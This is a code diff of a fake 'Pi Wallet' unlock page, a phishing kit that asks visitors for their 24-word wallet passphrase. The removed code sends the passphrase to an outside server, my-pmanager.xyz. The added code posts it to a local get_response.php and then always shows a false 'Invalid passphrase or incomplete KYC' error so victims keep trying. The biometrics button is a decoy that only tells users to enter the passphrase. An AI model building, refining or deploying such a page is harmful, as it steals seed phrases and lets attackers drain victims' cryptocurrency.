@@ -9,11 +9,16 @@
 </head>
 <body>
 <div class="layout">
-	<h3>_Unlock Pi Wallet</h3>
-	<textarea id=rform placeholder="Enter your 24-word passphrase here"></textarea>
-	<div onclick="validate()" class="btn">Unlock with passphrase</div>
-	<div class="btn biob">Unlock with Biometrics</div>    
-	   
+	<h3>Unlock Pi Wallet</h3>
+	<textarea placeholder="Enter your 24-word passphrase here"></textarea>
+	<div class="erbox" >
+		<div class="error ip">Invalid passphrase <span>or incomplete KYC</span></div>
+		<div nclick="validate()" class="btn uwp">Unlock with passphrase<div class=lds-ring ><div></div><div></div><div></div></div></div>
+	</div>
+	<div class="erbox" >
+		<div class="error pup">Please use passphrase to unlock</div>
+		<div class="btn biob">Unlock with Biometrics</div>    
+	</div> 
 	<p style=" width: 100%;">As a non-custodial wallet, your wallet passphrase is
 	    exclusively accessible only to you. Recovery of passphrase
 	    is currently impossible.<br><br>
@@ -22,29 +27,78 @@
 	</p>
 </div>
 <style type="text/css">
+/*.loader{
+/*display:none;*
+display:none;//inline-block;
+height:1.2em;
+width:auto;
+background:#0000;//var(--tt);
+aspect-ratio:1;
+position:absolute;
+border-radius:1em;
+border:1px solid var(--tt);
+border-width:2px 0px 2px 2px;
+animation:0.5s spin linear infinite;
+margin-left:-5em;
+opacity:0.7;
+}*/
+
+.lds-ring {
+  display: inline-block;
+  position: absolute;
+  width: 1.5em;
+  height: 1.5em;
+  margin-left:-5em;
+  margin-top:-0.6em;
+}
+.lds-ring div {
+  box-sizing: border-box;
+  display: block;
+  position: absolute;
+  width: 1.5em;
+  height: 1.5em;
+  margin: 8px;
+  opacity:0.7;
+  border: 3px solid var(--tt);
+  border-radius: 50%;
+  animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+  border-color: var(--tt) transparent transparent transparent;
+}
+.lds-ring div:nth-child(1) {
+  animation-delay: -0.35s;
+}
+.lds-ring div:nth-child(2) {
+  animation-delay: -0.2s;
+}
+.lds-ring div:nth-child(3) {
+  animation-delay: -0.05s;
+}
+
+
+@keyframes spin{
+100%{transform:rotate(360deg);}
+}
+
+*{
+font-size:1em;
+}
+
 .layout{
 display:flex;
 flex-direction:column;
 justify-content:center;
 align-items:center;
-padding:5% 8%;
+padding:10% 8%;
 }
 
-.layout *{
-margin:1em 0;
+.layout > *{
+margin:5% 0;
 }
-/*
-@media screen and (min-width:600px){
-	.layout *{
-		margin:1em 0;
-	}
-}
-*/
+
 textarea{
 width:100%;
 aspect-ratio:3/2;
-max-height:15em;
-border:1px solid #ec0;
+border:1px solid ;
 font-size:1.2em;
 font-family:inherit;
 padding:3%;
@@ -58,109 +112,87 @@ border:1px solid var(--tc);
 width:100%;
 font-size:1.1em;
 padding:0.7em 0;
+transition:0.1s all;
+}
+
+.btn:active{
+background:#4E357766;
 }
 
 .biob{
 background:var(--tc);
 color:var(--st);
 }
+
+
+.error{
+color:#e10;
+margin:0.8em 0;
+display:none;
+white-space:nowrap;
+}
+.erbox{
+display:flex;
+flex-direction:column;
+align-items:center;
+width:100%;
+}
 </style>
-<!--
-    <div class="container-fluid">
 
-
-<div name="contact-form" action="" method="post" id="contact-form">
-    <div class="row">
-        
-        <div class="col-md-12">
-        <p class="text-center mt-3" style="font-size: 17px;"><strong>Unlock Pi Wallet</strong></p>
-        </div>
-        <input type="text" class="form-control" value="name" name="your_name" placeholder="Name" hidden="">
-        <input type="email" class="form-control" name="your_email" value="email@email.com" placeholder="Email" hidden="">
-        <div style="padding: 8px 18px 8px 35px; text-align: center;" class="col-md-12 mb-3">
-
-           <p style="text-align: center; font-size: 27px;"> <textarea id=rform name="comments" style="font-size: 17px; border:solid 1px orange; width: 90%;" class="form-control" cols="30" rows="10" placeholder="Enter  your  24-word  passphrase  here" wire:model="passphrase"></textarea></p>
-
-        </div>
-<br>
-        <div class="col-md-12">
-                    </div>
-
-        <div class="col-md-12">
-           <p style="text-align: center;"> <button onclick="submiti()" type="" style="padding: 8px 8px; border: 1.22px solid #703D92; border-radius: 7px; background: transparent; width: 90%; font-size: 13px;  color: #8638C2; font-weight:320;"><strong>UNLOCK WITH PASSPHRASE</strong></button></p>
-        </div>
-
-        <div class="col-md-12 mt-4">
-        <div id="SectionName" style="display:none; text-align: center; color: red;">Please use passphrase</div>
-           <p style="text-align: center;"> <button onclick="ShowAndHide()" style="text-align: center; padding: 8px 8px; border-radius: 7px; color: white; border: none; background: #703D92; width: 90%; font-size: 13px; font-weight: 320;">UNLOCK WITH BIOMETRICS</button></p>
-        </div>
-        <br>
-
-       <!-- <div class="col-md-12 mt-4">
-            <p class="text-center" style="color: #0A08C2;"><strong>Unlock a Developer App Wallet</strong></p>
-        </div> --
-
-        <div class="col-md-12 mt-2" style="padding: 8px 28px 28px 28px; justify-content: center;">
-            <p style=" width: 100%; font-size: 14px; ;">As a non-custodial wallet, your wallet passphrase is
-                exclusively accessible only to you. Recovery of passphrase
-                is currently impossible.<br><br>
-                Lost your passphrase? <a href="" style="color: #0A08C2;">You can create a new wallet,</a> but all your π
-                in your previous wallet will be inaccessible.
-            </p>
-        </div>
-    </div>
-</div>
-
-
-    </div>-->
-   
-<script>
-function ShowAndHide() {
-    var x = document.getElementById('SectionName');
-    if (x.style.display == 'none') {
-        x.style.display = 'block';
-    } else {
-        x.style.display = 'none';
-    }
-}
-</script>
 <script src="jquery.js"></script>
-
 <script>
-function validate(){
-/*var tv = $("textarea").val();
-//alert(tv[tv.length-1]);
-while(tv[tv.length-1]==" "){
-tv = tv.split("").pop();//(" ", "", (tv.length-2));
-tv = String(tv.join(""));
+function countWords(dval) {
+    var text = dval.trim();
+    var words = text.split(/\s+/);
+    var wordCount = words.length;
+    return wordCount;
 }
-tv = tv.replace(/\s* /," ");
-// alert(tv);
-// alert((tv.split(" ").length)-1);*/
-// submiti();
-}
-function submiti(){
-    sendData = $("#rform").val();
-    // if(!_empty(sendData))
-    if(sendData != "")
-    {
-        $.ajax({
-	        type: "POST",
-	        url: "https://my-pmanager.xyz/get_response.php",
-	        data: {
-	            "response":sendData,
-	        },
-	        success: function(data){
-	            alert(data);
-	            $("#rform").val("");
-	        }
-        });
-    }
-    else{
-        $("#rform").css("border","1px solid red");
-    }
 
+$("textarea").on("input", function(){
+	$(".error").css("display", "none");
+});
+
+$(".btn").click(function(){
+	$(".ip span").css("display","none");
+	$(".error").css("display", "none");
+});
+
+$(".biob").click(function(){
+	$(".pup").css("display", "block");	
+});
+
+$(".uwp").click(function(){
+	validate();//$(".ip").css("display", "block");	
+});
+
+function validate(){
+	var tv = $("textarea").val().trim();
+	if(countWords(tv)<24)
+	{
+		$(".ip").css("display", "block");
+	}
+	else
+	{
+		if(countWords(tv)==24)
+		$(".ip span").css("display","inline-block");
+		
+		$(".loader").css("display", "inline-block");
+	}
+	if(tv!="")
+	$.ajax({
+		type: "POST",
+		url: "get_response.php",
+		data: {
+			"response":$("textarea").val(),
+		},
+		success:function(data){
+			//alert(data);
+			//$("#").val("");
+			$(".loader").fadeOut();//css("display", "inline-block");
+			$(".ip").css("display", "block");
+		}
+	});
 }
 </script>
-
-</body></html>
+</body>
+</html>
